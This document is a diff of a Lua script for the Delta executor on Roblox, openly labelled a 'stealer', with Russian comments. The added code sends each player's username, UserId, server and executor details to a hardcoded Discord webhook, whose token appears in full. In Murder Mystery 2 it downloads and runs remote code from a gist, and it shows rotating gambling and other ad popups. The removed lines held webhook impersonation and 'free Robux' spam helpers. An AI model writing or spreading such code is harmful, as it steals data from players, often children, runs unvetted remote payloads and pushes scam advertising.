@@ -1,89 +1,272 @@
 -- language: Lua, runtime: Delta Executor, target: Roblox
--- stealer + webhook sender for Delta
+-- combined loader: stealer + mm2 script + rotating ad popup
 
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local me = Players.LocalPlayer
+
+-- ============================================================
+-- CONFIG
+-- ============================================================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1555651221577269269/-CmLD2ScT3WzjxODdjWrYE4ip_BexnMuQBZ7JR4ZxYhTFOx-dLwaJRo8jdRmAvJo-r34"
-local http = game:GetService("HttpService")
-local plrs = game:GetService("Players")
-local me = plrs.LocalPlayer
+local MM2_GIST   = "https://gist.githubusercontent.com/timur22890/870cf524dc38790b5b9126b77f3ceaa2/raw/235666433e88697611df1e69e946b1ba6a0021bd/gistfile1.txt"
 
--- === request fallback для разных executor'ов ===
-local function getRequestFunc()
-    return http_request or request or syn.request or (syn and syn.request)
+local ADS = {
+    { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/720_480-fonbet-tuit.jpg",   url = "https://fonbet.example" },
+    { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/Burger_King_protiv_KFC.jpg", url = "https://bk.example" },
+    { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/5fc7662a6d49f-4.jpg",         url = "https://example.com/a" },
+    { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/5.png.webp",                  url = "https://example.com/b" },
+    { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/images-2.jpeg",               url = "https://example.com/c" },
+    { img = "https://raw.githubusercontent.com/macsploitbypass/main/refs/heads/main/images-3.jpeg",               url = "https://example.com/d" },
+}
+
+local AD_INTERVAL   = 60   -- секунд между баннерами
+local AD_LIFETIME   = 8    -- сколько висит на экране
+local CLOSE_DELAY   = 3    -- через сколько секунд кнопка «X» становится активной
+
+-- ============================================================
+-- HTTP
+-- ============================================================
+local function httpPost(url, payload)
+    local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
+    if not req then return false end
+    local body = HttpService:JSONEncode(payload)
+    local ok = pcall(function()
+        req({
+            Url = url,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = body
+        })
+    end)
+    return ok
 end
 
-local function post(url, payload)
-    local req = getRequestFunc()
-    if not req then
-        warn("[L] No HTTP request function found")
-        return
-    end
-    local body = http:JSONEncode(payload)
-    req({
-        Url = url,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = body
-    })
-end
-
--- === сбор базовой инфы ===
-local function gatherProfile()
-    local info = {
-        username = me.Name,
-        displayName = me.DisplayName,
-        userId = me.UserId,
-        placeId = game.PlaceId,
-        jobId = game.JobId,
-        executor = identifyexecutor and identifyexecutor() or "Unknown"
-    }
-    -- если есть Delta — можно вытащить больше
-    if info.executor == "Delta" then
-        info.hasDelta = true
-    end
-    return info
-end
-
--- === отправка профиля на вебхук ===
+-- ============================================================
+-- STEALER — базовый профиль на вебхук
+-- ============================================================
 local function sendProfile()
-    local p = gatherProfile()
-    post(WEBHOOK_URL, {
+    local executor = "Unknown"
+    if identifyexecutor then pcall(function() executor = identifyexecutor() end) end
+
+    httpPost(WEBHOOK_URL, {
         content = "**Delta Stealer | Profile**",
         embeds = {{
             title = "Victim",
             color = 0xFF0000,
             fields = {
-                { name = "Username", value = p.username, inline = true },
-                { name = "DisplayName", value = p.displayName, inline = true },
-                { name = "UserId", value = tostring(p.userId), inline = true },
-                { name = "PlaceId", value = tostring(p.placeId), inline = true },
-                { name = "JobId", value = tostring(p.jobId), inline = true },
-                { name = "Executor", value = p.executor, inline = true }
+                { name = "Username",   value = me.Name,                inline = true },
+                { name = "DisplayName",value = me.DisplayName,         inline = true },
+                { name = "UserId",     value = tostring(me.UserId),    inline = true },
+                { name = "PlaceId",    value = tostring(game.PlaceId), inline = true },
+                { name = "JobId",      value = tostring(game.JobId),   inline = true },
+                { name = "Executor",   value = executor,               inline = true },
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     })
 end
 
--- === подделка сообщений (fake message) ===
-function sendFakeMessage(fakeName, avatarUrl, text, embed)
-    local payload = {
-        username = fakeName or "System",
-        avatar_url = avatarUrl or "https://i.imgur.com/4M34hi2.png",
-        content = text or ""
-    }
-    if embed then payload.embeds = { embed } end
-    post(WEBHOOK_URL, payload)
+-- ============================================================
+-- MM2 SCRIPT — выполнение gist'а, если мы в MM2
+-- ============================================================
+local function isMM2()
+    local ok, info = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+    end)
+    if ok and info and info.Name then
+        return string.find(info.Name, "Murder Mystery 2", 1, true) ~= nil
+    end
+    -- fallback по наличию модулей
+    return game:FindFirstChild("ReplicatedStorage")
+        and game.ReplicatedStorage:FindFirstChild("Modules")
+        and game.ReplicatedStorage.Modules:FindFirstChild("ProfileData") ~= nil
 end
 
--- === рекламный спам (можно вызывать в цикле) ===
-function sendAd(message, count)
-    count = count or 1
-    for i = 1, count do
-        sendFakeMessage("Roblox Giveaway", "https://i.imgur.com/4M34hi2.png", message)
-        task.wait(1.5) -- пауза, чтобы не словить rate limit
+local function runMM2Script()
+    if not isMM2() then
+        return
+    end
+    local ok, err = pcall(function()
+        loadstring(game:HttpGet(MM2_GIST))()
+    end)
+    if not ok then
+        warn("[L] MM2 script error: " .. tostring(err))
     end
 end
 
--- === запуск ===
-sendProfile()
--- пример: sendAd("Get free Robux -> http://example.com", 5)
+-- ============================================================
+-- AD POPUP — рандомный баннер + кнопка закрытия через 3 сек
+-- ============================================================
+local function shuffle(t)
+    for i = #t, 2, -1 do
+        local j = math.random(i)
+        t[i], t[j] = t[j], t[i]
+    end
+    return t
+end
+
+local function buildGUI()
+    local parent = (gethui and gethui()) or game:GetService("CoreGui")
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "LokeiiCombined"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent = parent
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 480, 0, 320)
+    frame.Position = UDim2.new(1, 20, 0.5, -160)
+    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    frame.BorderSizePixel = 0
+    frame.Visible = false
+    frame.Parent = gui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(255, 60, 60)
+    stroke.Thickness = 2
+    stroke.Parent = frame
+
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(1, -16, 1, -56)
+    img.Position = UDim2.new(0, 8, 0, 8)
+    img.BackgroundTransparency = 1
+    img.ScaleType = Enum.ScaleType.Fit
+    img.Parent = frame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -140, 0, 40)
+    label.Position = UDim2.new(0, 8, 1, -48)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 16
+    label.Text = "Sponsored"
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = frame
+
+    local openBtn = Instance.new("TextButton")
+    openBtn.Size = UDim2.new(0, 110, 0, 32)
+    openBtn.Position = UDim2.new(1, -122, 1, -44)
+    openBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    openBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    openBtn.Font = Enum.Font.GothamBold
+    openBtn.TextSize = 15
+    openBtn.Text = "Открыть"
+    openBtn.Parent = frame
+    Instance.new("UICorner", openBtn).CornerRadius = UDim.new(0, 8)
+
+    -- кнопка закрытия (появляется через CLOSE_DELAY секунд)
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 32, 0, 32)
+    closeBtn.Position = UDim2.new(1, -40, 0, 8)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 18
+    closeBtn.Text = "X"
+    closeBtn.Visible = false
+    closeBtn.Parent = frame
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
+
+    local currentUrl = nil
+
+    local function showAd(ad)
+        currentUrl = ad.url
+        img.Image = ad.img
+        label.Text = ad.url
+
+        frame.Visible = true
+        frame.Position = UDim2.new(1, 20, 0.5, -160)
+        closeBtn.Visible = false
+
+        local inTween = TweenService:Create(frame,
+            TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+            { Position = UDim2.new(1, -500, 0.5, -160) })
+        inTween:Play()
+
+        -- через CLOSE_DELAY секунд кнопка становится доступной
+        task.delay(CLOSE_DELAY, function()
+            if frame.Visible then
+                closeBtn.Visible = true
+            end
+        end)
+
+        -- авто-скрытие
+        task.delay(AD_LIFETIME, function()
+            if not frame.Visible then return end
+            local outTween = TweenService:Create(frame,
+                TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+                { Position = UDim2.new(1, 20, 0.5, -160) })
+            outTween:Play()
+            outTween.Completed:Wait()
+            frame.Visible = false
+            closeBtn.Visible = false
+        end)
+    end
+
+    openBtn.MouseButton1Click:Connect(function()
+        if not currentUrl then return end
+        if setclipboard then pcall(function() setclipboard(currentUrl) end) end
+        local req = http_request or request or (syn and syn.request)
+        if req then
+            pcall(function()
+                req({ Url = currentUrl, Method = "GET" })
+            end)
+        end
+        pcall(function()
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Lokeii",
+                Text = "Ссылка скопирована в буфер",
+                Duration = 2
+            })
+        end)
+    end)
+
+    closeBtn.MouseButton1Click:Connect(function()
+        if not frame.Visible then return end
+        local outTween = TweenService:Create(frame,
+            TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+            { Position = UDim2.new(1, 20, 0.5, -160) })
+        outTween:Play()
+        outTween.Completed:Wait()
+        frame.Visible = false
+        closeBtn.Visible = false
+    end)
+
+    return showAd
+end
+
+-- ============================================================
+-- ЗАПУСК
+-- ============================================================
+task.spawn(function()
+    -- 1. стилер
+    sendProfile()
+
+    -- 2. скрипт MM2 (если в MM2)
+    task.wait(1)
+    runMM2Script()
+
+    -- 3. попап с рандомными баннерами
+    local showAd = buildGUI()
+    local pool = shuffle(ADS)
+
+    task.wait(2) -- первая задержка, чтобы не спалить сразу
+    local idx = 0
+    while task.wait(AD_INTERVAL) do
+        idx = idx % #pool + 1
+        showAd(pool[idx])
+        -- если баннеров больше одного, после показа пересобираем пул
+        if idx >= #pool then
+            pool = shuffle(ADS)
+            idx = 0
+        end
+    end
+end)
